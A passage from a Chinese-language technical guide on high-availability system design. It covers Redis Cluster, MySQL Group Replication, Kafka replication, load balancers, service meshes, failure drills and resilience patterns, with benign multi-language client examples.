4. B 的从节点发起选举，成为新主，接管 B 的槽。

**类比**：Gossip 像办公室八卦——每个人只跟几个人聊，但消息很快传遍全公司。比"中央广播"更抗故障（没有单点）。

### A.3 主从切换与选举

Redis Cluster 的故障转移类似 Raft：

1. 从节点发现主节点 FAIL。
2. 从节点等待随机时间（避免同时竞选），发起选举。
3. 向所有主节点拉票（"我数据最新，让我当主"）。
4. 获得多数主节点同意（N/2+1），升级为主。
5. 新主执行 \`CLUSTER FAILOVER\`，接管原主的槽，开始服务。

**为什么从节点要等随机时间？** 防止多个从节点同时竞选导致分票。和数据最新的从节点优先竞选（offset 越大选票权重越高）。

**脑裂防范**：Redis Cluster 要求多数主节点同意才能切换，所以不会出现两个主。但要注意"分区"场景——如果网络分区，少数派分区的主会拒绝写（因为无法联络多数），避免数据不一致。

### A.4 扩缩容与槽迁移

新增节点时，需要从现有节点"迁移"一部分槽过去：

1. 新节点加入集群。
2. 用 \`redis-cli --cluster reshard\` 指定迁移多少槽。
3. 工具逐个迁移槽：源节点把 slot 的 key 迁到新节点。
4. 迁移中，客户端访问该 slot 会被源节点返回 ASK 重定向到新节点。

**ASK vs MOVED**：

- MOVED：永久重定向，槽已经归新节点，客户端更新本地映射。
- ASK：临时重定向，槽正在迁移中，下次还问原节点。

迁移是"在线"的，不中断服务。但要注意大量 key 迁移时的性能影响，建议低峰做。

### A.5 Redis Cluster 的限制

1. **不支持跨槽事务**：MULTI/EXEC 的 key 必须在同一槽（用 Hash Tag）。
2. **不支持 SELECT**：只能用 0 号 DB。
3. **mset/mget 跨槽报错**：要用 Hash Tag 或 mset {tag}:k1 v1 {tag}:k2 v2。
4. **Pub/Sub 广播**：发布消息到所有节点，集群大时开销大，建议用 Redis Stream 替代。

### A.6 多语言对照

**Java（Lettuce）**：
\`\`\`java
RedisClusterClient client = RedisClusterClient.create(
    "redis://node1:6379,node2:6379,node3:6379");
StatefulRedisClusterConnection<String, String> conn = client.connect();
// Lettuce 自动处理 MOVED/ASK，维护槽映射
conn.sync().set("user:1001", "Alice");
\`\`\`

**Go（go-redis）**：
\`\`\`go
client := redis.NewClusterClient(&redis.ClusterOptions{
    Addrs: []string{":7000", ":7001", ":7002"},
    // 自动故障转移、读写分离
    ReadOnly: true,
})
client.Set(ctx, "user:1001", "Alice", 0).Err()
\`\`\`

**Python（redis-py）**：
\`\`\`python
from redis.cluster import RedisCluster
rc = RedisCluster(host='node1', port=6379)
rc.set('user:1001', 'Alice')
\`\`\`

**Node.js（ioredis）**：
\`\`\`javascript
const Redis = require('ioredis');
const cluster = new Redis.Cluster([
  { host: 'node1', port: 7000 },
  { host: 'node2', port: 7000 },
]);
cluster.set('user:1001', 'Alice');
\`\`\`

---

## 附录 B：MySQL MGR 工作流程详解

MySQL Group Replication（MGR）是 MySQL 5.7+ 的官方高可用方案，基于 Paxos 变种（XCom）实现强一致多主复制。

### B.1 MGR vs 传统主从

| 方案 | 一致性 | 自动切换 | 多主写 | 冲突处理 |
|------|--------|----------|--------|----------|
| 异步主从 | 弱（可能丢数据） | 否（手动） | 否 | 无（单向） |
| 半同步 | 中（至少一个从收到） | 否 | 否 | 无 |
| MGR | 强（Paxos） | 是 | 是（多主模式） | 自动检测+回滚 |

**为什么 MGR 强一致？** 写操作通过 Paxos 协议在多数节点达成一致后才提交，类似 Raft 的 log 复制。只要多数节点存活，数据不丢。

### B.2 写流程（单主模式）

1. 应用在主节点执行 \`INSERT/UPDATE/DELETE\`。
2. 主节点把写集（write set，含修改的行）广播给所有节点。
3. 所有节点对写集做冲突检测（基于行的版本号）。
4. 无冲突则 Apply（应用变更），有冲突则主节点回滚。
5. 多数节点 Apply 成功，主节点 Commit，返回客户端成功。

**冲突检测**：MGR 用乐观锁。每个事务在主节点"乐观"执行，广播写集时如果其他节点发现这行被别的事务改过，回滚该事务。

### B.3 故障检测与切换

MGR 内置故障检测：

- 每个节点定期发心跳，超时（默认 5 秒）标记为 SUSPECT。
- 多数节点同意，标记为 UNREACHABLE。
- 主节点挂了，自动选新主（基于 server_uuid 字典序最小的）。

**选主逻辑**：MGR 不像 Raft 那样按日志进度选，而是按 server_uuid 排序选第一个活着的。这个策略简单但不够智能——选出的主可能不是数据最新的（虽然 MGR 保证最终一致，但短期可能有延迟）。

### B.4 多主模式的限制

MGR 可以配置多主模式（所有节点都可写），但有坑：

1. **不支持 SERIALIZABLE 隔离级别**。
2. **不支持外键级联**（多主下级联会乱）。
3. **DDL 和 DML 不能并发**（DDL 没有原子性保证）。
4. **自增主键要错开**：每个节点 \`auto_increment_offset\` 不同，避免冲突。

实践建议：用单主模式更稳，多主模式除非业务有强烈需求。

### B.5 多语言对照（连接 MGR）

应用侧通过普通 MySQL 驱动连接即可，MGR 对应用透明。但要做"故障切换感知"——主挂了要知道连新主：

**Java（MySQL Connector/J + failover）**：
\`\`\`java
String url = "jdbc:mysql://node1,node2,node3/mydb" +
    "?failOverReadOnly=false&retriesAllDown=3";
Connection conn = DriverManager.getConnection(url, user, pass);
// 主挂了，驱动自动连下一个节点
\`\`\`

**Go（go-sql-driver）**：
\`\`\`go
db, _ := sql.Open("mysql", "user:pass@tcp(node1,node2,node3)/mydb")
// 需配合 ProxySQL 或 MySQL Router 做透明切换
\`\`\`

**ProxySQL 方案**：应用连 ProxySQL，ProxySQL 后面接 MGR，自动路由到主。这是生产常用方案。

---

## 附录 C：Kafka 高可用机制

Kafka 的高可用主要体现在"副本"和"ISR"机制。

### C.1 副本与 Leader

每个 Partition 有多个副本，其中一个 Leader，其余 Follower。所有读写都走 Leader，Follower 只是"备份"。

- **Leader 挂了**：从 Follower 中选一个当新 Leader。
- **Follower 挂了**：不影响，等它恢复后追上 Leader。

### C.2 ISR（In-Sync Replicas）

不是所有 Follower 都有资格当 Leader。Kafka 维护一个 ISR 列表——和 Leader"同步进度接近"的副本。

- Follower 落后太多（超过 \`replica.lag.time.max.ms\`，默认 10 秒），被踢出 ISR。
- 只有 ISR 里的副本才能当 Leader。

**为什么需要 ISR？** 防止选一个"数据落后很多"的 Follower 当 Leader，导致数据丢失。ISR 保证新 Leader 至少有最新数据。

### C.3 acks 与持久性

生产者发送消息的 \`acks\` 参数控制持久性：

| acks | 含义 | 可靠性 | 性能 |
|------|------|--------|------|
| 0 | 不等确认 | 最低 | 最高 |
| 1 | Leader 写入即确认 | 中 | 中 |
| all/-1 | ISR 全部写入才确认 | 最高 | 低 |

生产环境建议 \`acks=all\` + \`min.insync.replicas=2\`（至少 2 个副本同步才允许写），保证数据不丢。

### C.4 unclean.leader.election

\`unclean.leader.election=true\`：ISR 全挂时，允许选非 ISR 的副本当 Leader（可能丢数据）。追求可用性。

\`unclean.leader.election=false\`：ISR 全挂就等，保证数据不丢但牺牲可用性。

金融场景设 false，日志类可设 true。

---

## 附录 D：高可用反模式与陷阱

### D.1 假冗余：两个实例共享同一依赖

部署了 2 个应用实例，但都连同一个 Redis（单点）。Redis 挂了，两个实例一起挂——冗余失效。

**正确做法**：依赖也要冗余。应用多实例 + Redis 主从 + MySQL 主从，每层都冗余。

### D.2 静态配置导致的单点

DNS 配置只指向一个 IP，那个 IP 挂了全挂。负载均衡器配死一个后端，那个后端挂了 502。

**正确做法**：DNS 用多 IP 轮询 + 健康检查；LB 后端配多实例 + 主动健康检查 + 自动摘除。

### D.3 同机房冗余≠高可用

两个实例在同机房，机房断电/断网，全挂。这不是高可用，是"同一篮子的鸡蛋"。

**正确做法**：跨机房/跨可用区部署。AWS 多 AZ、阿里云多可用区、自建两地三中心。

### D.4 自动化脚本的隐式依赖

故障切换脚本依赖：监控、网络、SSH、配置中心。任一依赖挂了，脚本跑不了，故障转移失败。

**正确做法**：故障切换脚本要"自包含"——不依赖外部服务，能独立运行。关键脚本预装在所有节点，本地可触发。

### D.5 过度依赖告警人工处理

凌晨告警没人看，或者告警太多麻木了（告警风暴），故障拖了几小时。

**正确做法**：核心故障自动处理（自动切换、自动扩容），告警只是"通知"。减少告警噪音（聚合、降噪），让真正重要的告警被重视。

### D.6 容量规划只看平均值

按平均 QPS 扩容，结果大促峰值是平均 10 倍，瞬间打挂。

**正确做法**：按 P99/P999 峰值规划，预留 50% 余量。结合业务预测（大促、活动、增长）提前扩容。

### D.7 忽视优雅停机

发布时直接 kill 进程，导致正在处理的请求中断，用户看到 5xx。

**正确做法**：

1. 健康检查接口先返回不健康（LB 摘除流量）。
2. 等几秒让 LB 停止发新请求。
3. 拒绝新请求，处理完存量请求。
4. 关闭连接，退出。

Spring Boot 的 \`server.shutdown=graceful\`、Go 的 \`http.Server.Shutdown()\` 都是为此设计。

---

## 附录 E：故障演练与复盘方法论

### E.1 故障演练流程

1. **目标设定**：要验证什么场景？（如"Redis 主挂了应用是否自动切换"）。
2. **预案准备**：演练出问题怎么恢复（一键回滚、手动接管）。
3. **影响评估**：演练影响哪些用户？数据会丢吗？需要降级吗？
4. **小范围执行**：先在预发环境演练，再逐步到生产。
5. **监控观察**：演练中盯监控，发现问题立即停止。
6. **复盘总结**：哪些符合预期？哪些没扛住？根因是什么？

### E.2 故障复盘（Postmortem）

Google SRE 的复盘文化：**对事不对人**，每个故障都是改进机会。

复盘模板：

\`\`\`
## 故障概述
- 时间：2024-XX-XX 14:00-15:30（持续 90 分钟）
- 影响：下单接口 5xx 率 30%，约 10 万订单失败
- 严重级别：P1

## 时间线
- 14:00 告警：下单 5xx 上升
- 14:05 值班 SRE 介入，发现 DB 连接池打满
- 14:10 临时扩容 DB 连接池
- 14:20 定位到慢 SQL（新上线代码导致）
- 14:30 回滚代码
- 14:45 服务恢复
- 15:00 确认无残留问题
- 15:30 故障关闭

## 根因
新上线代码引入 N+1 查询，导致 DB 压力激增，连接池耗尽。

## 改进项
1. [P0] 上线前加慢 SQL 检测（已加 Code Review checklist）
2. [P0] DB 连接池增加告警阈值（连接数 > 80% 告警）
3. [P1] 引入 SQL Explain 卡点（CI 阶段自动检查）
4. [P2] 限流配置优化（DB 压力大时降级非核心查询）

## 经验教训
- Code Review 没发现 N+1，要加强 SQL 审查
- DB 连接池告警阈值设置不合理（设太低了）
- 回滚速度可以更快（一键回滚脚本）
\`\`\`

### E.3 演练工具对比

| 工具 | 厂商 | 特点 | 适用场景 |
|------|------|------|----------|
| Chaos Monkey | Netflix | 随机杀实例 | 基础容错验证 |
| Chaos Mesh | CNCF | K8s 原生，支持网络/IO/CPU 故障 | 云原生场景 |
| Litmus | CNCF | K8s 原生，ChaosHub 实验库 | K8s 应用 |
| Gremlin | 商业 | 商业级，GUI 操作 | 企业级 |
| 阿里 ChaoSBlade | 阿里 | 国产，支持 Java/容器/物理机 | 混合场景 |

---

## 附录 F：各云厂商高可用服务对照

| 能力 | AWS | 阿里云 | 腾讯云 | 自建 |
|------|-----|--------|--------|------|
| 负载均衡 | ALB/NLB | SLB | CLB | Nginx + Keepalived |
| 多可用区 | Multi-AZ | 多可用区 | 多可用区 | 跨机房 |
| RDS 高可用 | RDS Multi-AZ | RDS 高可用版 | TDSQL | MySQL MGR |
| 缓存高可用 | ElastiCache | Redis 企业版 | Redis 标准版 | Redis Cluster |
| 消息高可用 | MSK | RocketMQ | CKafka | Kafka 集群 |
| 容器编排 | EKS | ACK | TKE | K8s 自建 |
| 服务发现 | Cloud Map | Nacos | 北极星 | Consul/Eureka |
| 配置中心 | AppConfig | Nacos | TSE | Apollo/Nacos |
| 链路追踪 | X-Ray | ARMS | APM | Jaeger/SkyWalking |
| 监控 | CloudWatch | 云监控 | 云监控 | Prometheus |
| 日志 | CloudWatch Logs | SLS | CLS | ELK |
| 混沌 | FIS | AHAS | 无 | Chaos Mesh |

选型建议：

- **初创**：全用云厂商托管，省运维人力。
- **中型**：核心用云厂商，边缘自建（如监控用 Prometheus 替代云监控，避免锁定）。
- **大型**：多云/混合云，关键能力自建（避免锁定，议价能力强）。

---

## 附录 G：高可用指标体系与告警

### G.1 高可用相关 SLI

| 指标 | 含义 | 告警阈值（示例） |
|------|------|------------------|
| 可用性 | 成功请求/总请求 | < 99.95% 告警 |
| 延迟 P99 | 99% 请求的响应时间 | > 500ms 告警 |
| 错误率 | 5xx/总请求 | > 1% 告警 |
| 饱和度 | CPU/内存/连接池使用率 | > 80% 告警 |
| 主从延迟 | DB/缓存主从同步延迟 | > 1s 告警 |
| 故障切换次数 | 自动切换频率 | 1 小时内 > 0 告警 |
| 容灾演练通过率 | 演练成功/总演练 | < 90% 告警 |

### G.2 告警分级

- **P0**：核心服务不可用，立即响应，全员介入。如：下单接口全挂、DB 主挂且切换失败。
- **P1**：核心服务降级，5 分钟内响应。如：下单延迟 P99 > 2s、缓存命中率 < 50%。
- **P2**：非核心功能异常，30 分钟响应。如：评论服务 5xx、统计延迟。
- **P3**：容量预警，1 小时响应。如：CPU > 70%、磁盘 > 80%。

### G.3 告警降噪

告警风暴（一次故障触发几百条告警）让人麻木。降噪手段：

1. **聚合**：同一服务的告警合并成一条。
2. **依赖关联**：DB 挂导致应用报错，只告 DB，不告应用。
3. **静默**：维护窗口静默，避免发布告警。
4. **分级**：P0 电话+短信，P2 只发 IM。
5. **收敛**：5 分钟内同类告警只发一次。

---

## 附录 H：高可用与成本平衡

高可用不是越冗余越好——每多一份冗余就多一份成本。

**成本模型**：

- 双副本：成本 ×2，能扛单点故障。
- 三副本：成本 ×3，能扛同时双故障（极少见）。
- 跨地域：成本 ×4+（双地域双副本），能扛地域级故障。

**决策框架**：

1. **业务影响评估**：这个服务挂 1 小时损失多少钱？
2. **冗余成本**：多副本每年多花多少钱？
3. **对比**：如果"挂 1 小时损失" > "冗余年成本 × 挂的概率"，则值得冗余。

例如：

- 下单服务挂 1 小时损失 100 万，年故障概率 5%，期望损失 5 万。
- 双副本年成本 2 万。
- 5 万 > 2 万，值得冗余。

而内部 OA 系统挂 1 小时损失 1000 元，期望损失 50 元，双副本成本 2000 元——不值得冗余，单实例够用。

**核心原则**：高可用要"按价值分级"，核心链路高可用，边缘功能够用就行。把有限资源投在刀刃上。

---

## 附录 I：负载均衡高可用详解

负载均衡是流量入口，自身必须高可用，否则就是最大的单点。

### I.1 LVS + Keepalived 双机热备

经典方案：两台 LVS 机器跑 Keepalived，一台主一台备，共享 VIP。

**工作原理**：

- 主 LVS 持有 VIP，处理流量。
- Keepalived 用 VRRP 协议互相发心跳。
- 主挂了，备在 3 秒内接管 VIP，成为新主。
- 后端 RS（Real Server）健康检查由 Keepalived 做，挂了自动摘除。

**VRRP 协议**：Virtual Router Redundancy Protocol。两台路由器对外表现为一个虚拟路由器（共享 VIP），主备通过 VRRP 报文选举。

**配置示例（Keepalived）**：

\`\`\`
vrrp_instance VI_1 {
    state MASTER          # 备机写 BACKUP
    interface eth0
    virtual_router_id 51
    priority 100          # 备机写 90
    advert_int 1          # 心跳间隔 1 秒
    authentication {
        auth_type PASS
        auth_pass mypass
    }
    virtual_ipaddress {
        192.168.1.100     # VIP
    }
}

virtual_server 192.168.1.100 80 {
    delay_loop 6
    lb_algo wrr            # 加权轮询
    lb_kind DR             # 直接路由模式
    real_server 192.168.1.11 80 {
        weight 1
        TCP_CHECK {
            connect_port 80
            connect_timeout 3
        }
    }
}
\`\`\`

### I.2 Nginx 高可用

Nginx 作为七层 LB，自身也要高可用。方案：

1. **Nginx + Keepalived**：和 LVS 一样，双机热备 VIP。
2. **Nginx Plus**：商业版支持配置同步、健康检查增强。
3. **Nginx 集群 + DNS 轮询**：多个 Nginx 实例，DNS 返回多个 IP。

**Nginx 健康检查**：

- 开源版：被动检查（请求失败标记 down）。
- 商业版：主动健康检查（定期探测，主动摘除）。
- 开源方案：用 nginx_upstream_check_module 第三方模块。

### I.3 四层 vs 七层 LB 高可用

| 维度 | 四层（LVS） | 七层（Nginx） |
|------|-------------|---------------|
| 性能 | 极高（内核态） | 高（用户态） |
| 功能 | 简单（只转 TCP/UDP） | 丰富（路径、Header、Cookie 路由） |
| 高可用 | Keepalived VIP | Keepalived VIP 或 DNS |
| 适用 | 入口流量分发 | 业务路由、SSL 卸载 |

生产常用"四层 + 七层"双层架构：LVS 做入口分发，Nginx 做业务路由，两层都双机热备。

### I.4 云负载均衡

云厂商 LB 自身高可用（多可用区），用户无需关心。但要注意：

- **跨可用区 LB**：确保 LB 后端实例跨可用区。
- **健康检查配置**：阈值别太敏感（误摘），也别太迟钝（故障发现慢）。
- **会话保持**：如有状态，配会话保持或用 Sticky Cookie。

---

## 附录 J：服务网格与高可用

Istio/Linkerd 等服务网格把流量管控从应用剥离到 Sidecar（Envoy），对高可用有影响。

### J.1 Sidecar 自身高可用

每个 Pod 一个 Envoy Sidecar，Envoy 挂了 Pod 也"挂"（流量进不来）。所以：

- Envoy 要稳定（资源限制、内存控制）。
- K8s 健康检查覆盖 Sidecar（Pod 级健康检查）。
- Sidecar 异常时重启 Pod（K8s 自动重启容器）。

### J.2 控制面高可用

Istio 控制面（Istiod）管理配置下发。控制面挂了不影响数据面（Envoy 继续用旧配置），但新配置无法生效。

- 控制面多副本部署（K8s Deployment replicas ≥ 3）。
- 跨可用区部署。
- 配置缓存到本地，控制面恢复后增量同步。

### J.3 流量治理能力

服务网格提供丰富的高可用能力：

- **重试**：失败自动重试（但要小心放大效应）。
- **超时**：每个调用设超时，防止级联阻塞。
- **熔断**：基于连接数、错误率自动熔断。
- **故障注入**：注入延迟/错误做混沌测试。
- **流量分割**：蓝绿、金丝雀通过权重路由实现。

### J.4 多语言对照

服务网格对应用透明，各语言都受益：

**Java（Spring Cloud → Istio）**：
\`\`\`yaml
# 传统 Spring Cloud 需要在代码里配熔断
@HystrixCommand(fallbackMethod = "fallback")
public String callService() { ... }

# Istio 方式：配置层面控制，代码无侵入
apiVersion: networking.istio.io/v1
kind: DestinationRule
metadata:
  name: my-service
spec:
  trafficPolicy:
    outlierDetection:
      consecutiveErrors: 5
      interval: 10s
      baseEjectionTime: 30s
\`\`\`

**Go/Python/Node.js**：无需在代码里写熔断逻辑，Istio 统一兜底。这是服务网格的核心价值——语言无关的流量治理。

---

## 附录 K：数据库高可用进阶

### K.1 读写分离的高可用

主写从读架构，主挂了怎么办？

- **方案一**：从库提升为主（手动或自动），应用切到新主。风险：从库可能有延迟，丢失少量数据。
- **方案二**：主挂了直接拒绝写，只读降级，等主恢复。保证数据一致但牺牲可用性。
- **方案三**：用 MGR/MHA 等自动切换方案。

**多语言对照（读写分离连接）**：

**Java（ShardingSphere）**：
\`\`\`java
// ShardingSphere 自动路由读从、写主
String sql = "SELECT * FROM user WHERE id = 1";  // 走从库
String sql2 = "INSERT INTO user ...";            // 走主库
\`\`\`

**Go（GORM）**：
\`\`\`go
db, _ := gorm.Open(mysql.Open(dsn), &gorm.Config{})
// 主从配置
db.Use(dbresolver.Register(dbresolver.Config{
    Sources:  []gorm.Dialector{mysql.Open(primaryDSN)},
    Replicas: []gorm.Dialector{mysql.Open(replicaDSN)},
}))
\`\`\`

### K.2 分库分表的高可用

分库分表后，单个分片挂了只影响部分数据。但要处理"分片故障"：

- **降级**：挂掉的分片返回降级数据，其他分片正常。
- **副本切换**：分片有主从，主挂切从。
- **限流**：剩余分片承担全量流量可能过载，要限流。

### K.3 缓存高可用进阶

Redis 主从切换时，注意：

1. **切换瞬间数据丢失**：异步复制有延迟，主挂时未同步的数据丢。用 \`wait\` 命令等同步（牺牲性能）。
2. **缓存击穿**：热点 key 过期，大量请求打到 DB。用互斥锁或逻辑过期。
3. **缓存雪崩**：大量 key 同时过期。过期时间加随机抖动。
4. **缓存穿透**：查不存在的 key。用布隆过滤器或缓存空值。

**多语言对照（Redis 哨兵连接）**：

**Python（redis-py）**：
\`\`\`python
from redis.sentinel import Sentinel
sentinel = Sentinel([('sentinel1', 26379), ('sentinel2', 26379)])
master = sentinel.master_for('mymaster', socket_timeout=0.5)
master.set('key', 'value')
\`\`\`

**Node.js（ioredis）**：
\`\`\`javascript
const redis = new Redis({
  sentinels: [{ host: 'sentinel1', port: 26379 }],
  name: 'mymaster',
});
\`\`\`

---

## 附录 L：高可用架构演进案例

以一个电商系统为例，看高可用如何逐步演进。

### L.1 阶段一：单体单机（日活 1000）

\`\`\`
用户 → Nginx → 单体应用（1 台）→ MySQL（1 台）→ Redis（1 台）
\`\`\`

- 全单点，挂了就全挂。
- 但日活小，故障概率低，恢复快。
- 成本最低，适合早期。

**这个阶段不追求高可用，追求"快速恢复"**——出问题重启、回滚要快。

### L.2 阶段二：应用多实例（日活 1 万）

\`\`\`
用户 → Nginx → 应用 ×3（负载均衡）→ MySQL（主从）→ Redis（主从）
\`\`\`

- 应用 3 实例，单实例挂不影响。
- DB 主从，主挂手动切从。
- 缓存主从，主挂切从。
- 仍可能单机房故障。

**这个阶段引入"冗余"**，但故障切换靠人工，MTTR（平均恢复时间）较长。

### L.3 阶段三：自动故障转移（日活 10 万）

\`\`\`
用户 → LVS + Keepalived → 应用 ×6（跨机房）→ MySQL MGR → Redis Cluster
\`\`\`

- LVS 双机热备，VIP 自动漂移。
- 应用跨机房部署，机房挂不影响。
- DB MGR 自动选主，秒级切换。
- 缓存 Cluster 自动 failover。
- 限流熔断保护后端。

**这个阶段"自动化"**，故障秒级自愈，MTTR < 1 分钟。

### L.4 阶段四：异地多活（日活 100 万+）

\`\`\`
用户 → 智能DNS → 北京机房 / 上海机房（双活）
每个机房：LVS → 应用集群 → DB/缓存集群
数据：DTS 双向同步
\`\`\`

- 用户路由到最近机房，延迟低。
- 单机房挂，DNS 切到另一机房，分钟级恢复。
- 数据双向同步，要处理冲突。
- 全链路压测、混沌工程常态化。

**这个阶段"容灾"**，能扛机房级、城市级故障，MTTR < 5 分钟，RPO < 1 分钟。

### L.5 阶段五：多云容灾（日活 1000 万+）

\`\`\`
用户 → 全局DNS → 阿里云 / AWS（双云）
跨云数据同步、跨云故障切换
\`\`\`

- 单云挂，切到另一云。
- 避免云厂商锁定。
- 成本最高，架构最复杂。

**这个阶段"抗云故障"**，应对极端情况（如某云厂商大面积故障）。只有超大型业务才需要。

### L.6 演进启示

1. **按业务规模选架构**：小公司别学大厂搞异地多活，成本扛不住。
2. **逐步演进**：每阶段解决主要矛盾，别一步到位。
3. **自动化优先**：人工运维是瓶颈，能自动化的先自动化。
4. **容灾要演练**：没演练过的容灾等于没有，故障时才知道哪里有坑。
5. **成本意识**：高可用要花钱，ROI 要算清楚。

---

## 附录 M：高可用面试深度问答

### M.1 "你的系统可用性 99.99%，怎么算的？"

答：基于 SLI 计算。统计周期内（如月）：

\`\`\`
可用性 = (总时间 - 不可用时间) / 总时间 × 100%
\`\`\`

不可用定义：核心接口可用性 < 99% 持续 1 分钟以上算"不可用"。

例如 30 天 = 43200 分钟，宕机 4 分钟：
\`\`\`
可用性 = (43200 - 4) / 43200 = 99.9907% ≈ 99.99%
\`\`\`

要诚实——是"承诺"还是"实测"。SLO 是目标，SLI 是实测，两者可能有 gap。

### M.2 "主从切换时数据不一致怎么办？"

答：分情况：

1. **异步复制**：主挂时从可能没最新数据。切换会丢数据。缓解：半同步、等待复制（\`WAIT\` 命令）。
2. **脑裂**：网络分区导致双主。两个主都写，合并时冲突。缓解：Quorum（多数派才写）、fencing（隔离旧主）。
3. **切换后旧主恢复**：旧主可能有未同步数据，恢复后要丢弃。缓解：版本号比对、人工介入。

### M.3 "Redis Cluster 和哨兵区别？"

答：

- **哨兵**：主从架构（1 主多从），哨兵负责监控和选主。适合数据量小（单机放得下）。扩容靠主从同步，数据全量。
- **Cluster**：分片架构（多主多从，数据分槽）。适合数据量大（单机放不下）。扩容靠槽迁移，水平扩展。

选型：数据 < 30GB 用哨兵，> 30GB 用 Cluster。

### M.4 "如何防止缓存雪崩？"

答：四道防线：

1. **过期时间随机化**：\`expire = base + random(0, 300)\`，避免同时过期。
2. **多级缓存**：本地缓存（Caffeine）+ 分布式缓存（Redis），Redis 挂了本地兜底。
3. **熔断降级**：DB 压力大时熔断，返回降级数据。
4. **预热**：关键 key 提前加载，避免冷启动。

### M.5 "解释下 Raft 和 Paxos 的区别"

答：

- **Paxos**：理论性强，难理解难实现。Multi-Paxos 是工程化版本。
- **Raft**：为"可理解性"设计，易于实现。强领导者（Leader），日志只能从 Leader 流向 Follower。
- **区别**：Raft 是 Paxos 的简化变种。Raft 强调 Leader，Paxos 可以多 Proposer。Raft 有明确的选主、日志复制、安全性约束。
- **应用**：Etcd 用 Raft，Consul 用 Raft，ZooKeeper 用 ZAB（Paxos 变种），MGR 用 XCom（Paxos 变种）。

### M.6 "异地多活数据怎么保证一致？"

答：几种方案：

1. **单元化**：用户路由到固定单元，数据写在本地，不跨单元。同步异步做备份。冲突少。
2. **双向同步 + 冲突解决**：用时间戳/版本号裁决，最后写赢。适合弱一致场景。
3. **CRDT**：无冲突复制数据类型，自动合并。适合计数器、集合等。
4. **中心化协调**：所有写经过中心，串行化。强一致但性能差。

电商用单元化（按用户 ID 路由），社交用双向同步（评论可异步）。

---

## 附录 N：高可用设计模式总结

### N.1 冗余模式

冗余是高可用的基石。但冗余有几种形态：

1. **主备冗余**：一主一备，备机闲置。切换时有空窗期。成本低，资源利用率 50%。
2. **主主冗余**：两台都工作，互为备份。无空窗期，资源利用率 100%。但状态同步复杂。
3. **N+1 冗余**：N 台工作 + 1 台备用。任一挂了备用顶上。比 2N 省资源。
4. **多副本冗余**：3 副本以上（如 Kafka、ES）。Quorum 读写，容忍少数派故障。

选型：

- 强一致选主备（单点写入避免冲突）。
- 高吞吐选主主（分散压力）。
- 关键数据选多副本（容忍多故障）。

### N.2 故障隔离模式

故障要"局部化"，不能扩散：

1. **Bulkhead 舱壁模式**：把资源分组，一组故障不影响其他组。如线程池隔离——订单线程池挂了不影响支付。
2. **Circuit Breaker 熔断**：依赖挂了快速失败，不耗尽资源。
3. **Rate Limiter 限流**：过载时拒绝部分请求，保住系统不死。
4. **Bulkhead + Async**：异步化非核心调用，挂了不影响主流程。

**舱壁模式示意**：

\`\`\`
请求 → 路由 → [订单线程池] → 订单服务
              [支付线程池] → 支付服务
              [评论线程池] → 评论服务（挂了不影响订单支付）
\`\`\`

### N.3 超时与重试模式

每个跨进程调用必须有超时。超时是最简单的"故障隔离"——挂了不等，快速失败。

**超时设置原则**：

- 超时 = P99 响应时间 × 2~3。
- 级联调用的超时要递增（A→B→C，A 超时 > B 超时 > C 超时）。
- 数据库超时 < 应用超时 < 网关超时。

**重试原则**：

- 只重试可重试的错误（网络超时、5xx），不重试 4xx。
- 重试次数有限（1-3 次）。
- 重试要退避（指数退避 + 抖动），避免重试风暴。
- 幂等接口才重试，否则可能重复操作。

### N.4 降级模式

降级是"主动牺牲非核心，保核心"：

1. **返回默认值**：推荐服务挂了，返回热门商品兜底。
2. **返回缓存**：DB 挂了，返回缓存数据（可能稍旧）。
3. **异步化**：实时改异步，先存队列后处理。
4. **功能关闭**：高峰期关闭评论、积分等功能。

降级要"可配置、可开关"——通过配置中心动态控制，不用改代码发布。

### N.5 限流模式

限流是"过载保护"：

| 算法 | 特点 | 适用 |
|------|------|------|
| 计数器 | 简单，但有临界问题 | 低精度 |
| 滑动窗口 | 平滑，无临界 | 通用 |
| 令牌桶 | 允许突发 | API 网关 |
| 漏桶 | 严格匀速 | 整流 |

**多级限流**：

- 网关层：全局限流，防 DDoS。
- 应用层：单服务限流，防过载。
- 接口层：热点接口限流，防雪崩。
- 资源层：DB 连接池限流，防打满。

### N.6 熔断模式

熔断器三态：

- **Closed（关闭）**：正常调用。统计失败率。
- **Open（打开）**：失败率超阈值，直接拒绝，不调用下游。
- **Half-Open（半开）**：过一会儿尝试放少量请求，成功则回 Closed，失败则回 Open。

熔断 vs 限流：

- 限流：基于"自己"的容量，防过载。
- 熔断：基于"下游"的健康，防级联失败。

### N.7 优雅降级与兜底

系统要"层层兜底"：

\`\`\`
请求 → 正常逻辑（DB+缓存）
  ↓ 失败
  → 缓存兜底（只查缓存）
  ↓ 失败
  → 本地兜底（Caffeine）
  ↓ 失败
  → 静态兜底（默认值/降级页面）
\`\`\`

每一层兜底都是"可用性的保险"。即使全挂，也要返回友好降级页，而不是白屏 5xx。

### N.8 多语言对照（熔断实现）

**Java（Resilience4j）**：
\`\`\`java
CircuitBreaker cb = CircuitBreaker.of("myService", CircuitBreakerConfig.custom()
    .failureRateThreshold(50)        // 50% 失败率熔断
    .waitDurationInOpenState(Duration.ofSeconds(30))
    .slidingWindowSize(10)            // 滑动窗口 10 次请求
    .build());
Supplier<String> supplier = CircuitBreaker.decorateSupplier(cb, () -> callRemote());
\`\`\`

**Go（sony/gobreaker）**：
\`\`\`go
cb := gobreaker.NewCircuitBreaker(gobreaker.Settings{
    Name:        "myService",
    MaxRequests: 5,
    Interval:    10 * time.Second,
    Timeout:     30 * time.Second,
    ReadyToTrip: func(counts gobreaker.Counts) bool {
        return counts.ConsecutiveFailures > 5
    },
})
result, err := cb.Execute(func() (interface{}, error) {
    return callRemote()
})
\`\`\`

**Python（pybreaker）**：
\`\`\`python
import pybreaker
cb = pybreaker.CircuitBreaker(fail_max=5, reset_timeout=30)
@cb
def call_remote():
    return requests.get('http://service/api')
\`\`\`

**Node.js（opossum）**：
\`\`\`javascript
const CircuitBreaker = require('opossum');
const breaker = new CircuitBreaker(callRemote, {
  timeout: 3000,
  errorThresholdPercentage: 50,
  resetTimeout: 30000
});
breaker.fire().then(result => console.log(result));
\`\`\`

---

## 附录 O：高可用checklist 进阶版

完整的 50 项高可用检查清单：

**架构层**：

1. ☐ 是否消除所有单点？
2. ☐ 每层是否有冗余（应用、缓存、DB、MQ）？
3. ☐ 是否跨可用区部署？
4. ☐ 是否有异地容灾？
5. ☐ 是否做了容量规划？

**应用层**：

6. ☐ 应用是否无状态？
7. ☐ 是否有健康检查接口？
8. ☐ 是否支持优雅停机？
9. ☐ 是否有限流配置？
10. ☐ 是否有熔断配置？
